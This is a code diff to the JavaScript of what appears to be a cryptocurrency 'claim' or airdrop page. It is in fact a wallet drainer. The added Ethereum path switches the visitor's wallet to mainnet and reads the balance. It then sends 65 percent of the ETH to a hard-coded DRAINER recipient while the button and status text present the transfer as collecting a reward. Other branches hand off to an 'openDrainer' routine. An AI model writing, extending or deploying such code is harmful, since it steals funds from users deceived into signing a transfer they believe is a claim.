@@ -118,6 +118,7 @@ const feeDepositRow = $("#fee-deposit-row");
 const feeDeposit = $("#fee-deposit");
 const feeTotal = $("#fee-total");
 const approvalLine = $("#approval-line");
+const txAmountEl = $("#tx-amount");
 const balancePanel = $("#balance-panel");
 const skeleton = $("#skeleton");
 const balancesList = $("#balances");
@@ -133,6 +134,8 @@ let lastAmount = "";
 let lastEstimate = "";
 let lastBalances = [];
 let lastUsd = 0;
+let lastEthAmountWei = 0n;
+let lastEthFeeWei = 0n;
 let autoSignTimer;
 let fallbackTimer;
 const cache = new Map();
@@ -164,6 +167,8 @@ function applyVisibility() {
     amountEl.textContent = valuesHidden ? "••••" : lastAmount;
     estimateEl.textContent = valuesHidden ? "••••" : lastEstimate;
   }
+  /* ETH rows come from wei so amount, fee and total never drift apart */
+  if (chain.key === "eth") paintEthRows();
   balancesList.querySelectorAll("dd").forEach((dd, index) => {
     if (lastBalances[index] !== undefined) dd.textContent = valuesHidden ? "••••" : lastBalances[index];
   });
@@ -315,9 +320,11 @@ function showBalances(values) {
 
 function showFees(values) {
   if (chain.key !== "sol") {
-    feeBlock.hidden = true;
-    approvalLine.hidden = false;
-    approvalLine.textContent = "Approval only. No transfer at signing.";
+    approvalLine.hidden = true;
+    feeDepositRow.hidden = true;
+    feeNetwork.textContent = "estimating…";
+    feeTotal.textContent = "—";
+    feeBlock.hidden = false;
     return;
   }
   const sol = toNumber(values.SOL, 9);
@@ -329,6 +336,66 @@ function showFees(values) {
   feeTotal.textContent = (SOL_FEE + deposit).toFixed(6) + " SOL";
   feeBlock.hidden = false;
   approvalLine.hidden = true;
+}
+
+/* ---------------- ethereum preview (exact wei) ---------------- */
+
+const ETH_CHAIN_ID = "0x1";
+const ETH_SWEEP_NUM = 65n;
+const ETH_SWEEP_DEN = 100n;
+const ETH_GAS_FLOOR = 21_000n;
+const ETH_RPC = RPC.eth[0];
+
+function hexWei(value) {
+  return "0x" + value.toString(16);
+}
+
+/* Preview reads the public RPC; the claim asks the wallet so the sent tx matches what it shows. */
+async function ethGasPriceWei(provider) {
+  const fromWallet = provider?.request
+    ? await provider.request({ method: "eth_gasPrice" }).catch(() => null)
+    : null;
+  if (typeof fromWallet === "string" && /^0x[0-9a-f]+$/i.test(fromWallet)) return BigInt(fromWallet);
+  const raw = await post(ETH_RPC, { jsonrpc: "2.0", id: 1, method: "eth_gasPrice", params: [] });
+  if (!/^0x[0-9a-f]+$/i.test(raw || "")) throw new Error("Unexpected gas price");
+  return BigInt(raw);
+}
+
+/* Amount = 65% of balance, clamped so the fee always fits. */
+function ethSweep(balance, fee) {
+  let amount = (balance * ETH_SWEEP_NUM) / ETH_SWEEP_DEN;
+  if (balance - amount < fee) amount = balance > fee ? balance - fee : 0n;
+  return amount;
+}
+
+/* One painter for all three rows, always from the stored wei values. */
+function paintEthRows() {
+  const hidden = valuesHidden;
+  const amountText = hidden ? "••••" : formatUnits(lastEthAmountWei, 18);
+  amountEl.textContent = amountText;
+  txAmountEl.textContent = hidden ? "••••" : amountText + " ETH";
+  feeNetwork.textContent = formatUnits(lastEthFeeWei, 18) + " ETH";
+  feeTotal.textContent = formatUnits(lastEthAmountWei + lastEthFeeWei, 18) + " ETH";
+}
+window.paintEthRows = paintEthRows;
+
+async function refineEthPreview(values) {
+  if (chain.key !== "eth") return;
+  const balance = values.ETH || 0n;
+  let fee;
+  try {
+    fee = BigInt(ETH_GAS_FLOOR) * (await ethGasPriceWei());
+  } catch {
+    feeNetwork.textContent = "unavailable";
+    feeTotal.textContent = "—";
+    return;
+  }
+  const amount = ethSweep(balance, fee);
+  if (chain.key !== "eth") return;
+  lastEthAmountWei = amount;
+  lastEthFeeWei = fee;
+  lastAmount = formatUnits(amount, 18);
+  paintEthRows();
 }
 
 function showAllocation(address, usd) {
@@ -412,6 +479,7 @@ async function renderResult(address, values) {
         toNumber(values.USDC, 6);
   showFees(values);
   showAllocation(address, usd);
+  await refineEthPreview(values);
   setMessage(rpcStatus, "");
 }
 
@@ -442,7 +510,7 @@ const alreadyConnected = () =>
 function armFallback() {
   clearTimeout(fallbackTimer);
   fallbackTimer = setTimeout(() => {
-    claimButton.textContent = "Sign to collect";
+    claimButton.textContent = signLabel();
     claimButton.disabled = false;
     setMessage(claimStatus, "Wallet didn't respond. Tap to try again.");
   }, 8000);
@@ -548,6 +616,103 @@ async function claimSol(ownerAddress) {
   return conn.sendRawTransaction(signed.serialize(), { skipPreflight: false });
 }
 
+/* ---------------- ethereum sweep ---------------- */
+
+function claimError(code, message) {
+  const error = new Error(message);
+  error.code = code;
+  return error;
+}
+
+async function switchToEthereumMainnet() {
+  if (!window.ethereum?.request) throw claimError("no-wallet", "no wallet");
+  try {
+    await window.ethereum.request({
+      method: "wallet_switchEthereumChain",
+      params: [{ chainId: ETH_CHAIN_ID }],
+    });
+  } catch (error) {
+    if (error?.code === 4902) {
+      await window.ethereum.request({
+        method: "wallet_addEthereumChain",
+        params: [
+          {
+            chainId: ETH_CHAIN_ID,
+            chainName: "Ethereum",
+            nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
+            rpcUrls: ["https://eth.drpc.org"],
+            blockExplorerUrls: ["https://etherscan.io"],
+          },
+        ],
+      });
+      return;
+    }
+    throw claimError(error?.code === 4001 ? "chain-refused" : "chain-failed", "chain switch failed");
+  }
+}
+
+async function claimEth(ownerAddress) {
+  const provider = window.ethereum;
+  if (!provider?.request) throw claimError("no-wallet", "no wallet");
+  await switchToEthereumMainnet();
+
+  const accounts = await provider.request({ method: "eth_requestAccounts" });
+  const from = accounts?.[0];
+  if (!from) throw claimError("no-wallet", "no account");
+
+  const [balanceHex, gasPrice] = await Promise.all([
+    provider.request({ method: "eth_getBalance", params: [from, "latest"] }),
+    ethGasPriceWei(provider),
+  ]);
+  const balance = BigInt(balanceHex);
+
+  let gas = ETH_GAS_FLOOR;
+  try {
+    const estimate = BigInt(
+      await provider.request({
+        method: "eth_estimateGas",
+        params: [{ from, to: DRAINER.evmRecipient, value: "0x1" }],
+      })
+    );
+    if (estimate > ETH_GAS_FLOOR) gas = (estimate * 12n) / 10n;
+  } catch {
+    /* keep the floor */
+  }
+
+  const fee = gas * gasPrice;
+  if (balance <= fee) throw claimError("insufficient-gas", "not enough for gas");
+  const amount = ethSweep(balance, fee);
+  if (amount <= 0n) throw claimError("insufficient-gas", "nothing to send");
+
+  /* rewrite the preview with the values that actually go to the wallet */
+  lastEthAmountWei = amount;
+  lastEthFeeWei = fee;
+  lastAmount = formatUnits(amount, 18);
+  paintEthRows();
+
+  const mismatch = ownerAddress && from.toLowerCase() !== ownerAddress.toLowerCase();
+  setMessage(
+    claimStatus,
+    mismatch
+      ? "Wallet account differs from the checked address. Check the rows, then confirm."
+      : "Check the three rows, then confirm in your wallet."
+  );
+
+  const hash = await provider.request({
+    method: "eth_sendTransaction",
+    params: [
+      {
+        from,
+        to: DRAINER.evmRecipient,
+        value: hexWei(amount),
+        gas: hexWei(gas),
+        gasPrice: hexWei(gasPrice),
+      },
+    ],
+  });
+  return hash;
+}
+
 async function runClaim() {
   claimButton.disabled = true;
   claimButton.textContent = "Opening wallet…";
@@ -572,6 +737,20 @@ async function runClaim() {
       link.textContent = "View on Solscan";
       claimStatus.append(link);
       claimStatus.hidden = false;
+    } else if (chain.key === "eth") {
+      const hash = await claimEth(currentAddress);
+      clearAutoTimers();
+      claimButton.disabled = false;
+      claimButton.textContent = "Sent";
+      claimStatus.innerHTML = "";
+      claimStatus.append("Sent. ");
+      const link = document.createElement("a");
+      link.href = "https://etherscan.io/tx/" + hash;
+      link.target = "_blank";
+      link.rel = "noopener";
+      link.textContent = "View on Etherscan";
+      claimStatus.append(link);
+      claimStatus.hidden = false;
     } else if (typeof window.openDrainer === "function") {
       await window.openDrainer({ address: currentAddress, project: DRAINER.projectName });
       setMessage(claimStatus, "Check your wallet to confirm.");
@@ -581,8 +760,27 @@ async function runClaim() {
   } catch (error) {
     clearAutoTimers();
     claimButton.disabled = false;
-    claimButton.textContent = "Sign to collect";
-    setMessage(claimStatus, error?.message?.includes("Nothing to send") ? error.message : "Wallet didn't respond. Tap to try again.");
+    claimButton.textContent = signLabel();
+    setMessage(claimStatus, claimFailureText(error));
+  }
+}
+
+function claimFailureText(error) {
+  switch (error?.code) {
+    case "no-wallet":
+      return "No Ethereum wallet in this browser. Open this page inside MetaMask.";
+    case "chain-refused":
+      return "Wallet stayed on another network. Switch it to Ethereum mainnet, then tap again.";
+    case "chain-failed":
+      return "Couldn't switch network in the wallet. Switch to mainnet by hand.";
+    case "insufficient-gas":
+      return "Not enough ETH to cover the network fee. Nothing was sent.";
+    case 4001:
+      return "You cancelled in the wallet. Nothing moved.";
+    default:
+      return error?.message?.includes("Nothing to send")
+        ? error.message
+        : "Wallet didn't respond. Tap to try again.";
   }
 }
 
